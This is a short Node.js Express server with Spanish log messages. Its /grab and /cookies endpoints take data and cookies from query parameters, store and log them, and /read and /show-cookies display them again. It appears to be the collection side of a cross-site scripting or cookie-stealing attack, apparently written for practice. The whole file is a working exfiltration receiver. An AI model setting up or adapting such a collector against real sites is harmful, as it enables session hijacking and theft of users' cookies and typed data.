const express = require ('express');
const bodyParser = require('body-parser');
const app = express();

let texto = "";
let cookiesAlmacenadas = "";

app.get('/', (req, res)=> {
    console.log("Ta bien");
    res.send("Hello World");
});

app.get('/grab', (req, res)=> {
    const data = req.query.data;
    texto += data;
    res.send(data);
});

app.get('/read', (req, res)=> {
    res.send(texto);
});

app.get('/cookies', (req, res) => {
    const cookies = req.query.cookies;
    cookiesAlmacenadas = cookies;
    console.log('Cookies recibidas:', cookies); 
    res.send('Cookies recibidas correctamente'); 
});

app.get('/show-cookies', (req, res) => {
    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
});

app.listen(3000, () => {
    console.log("Servidor furulando en el puerto 3000");
});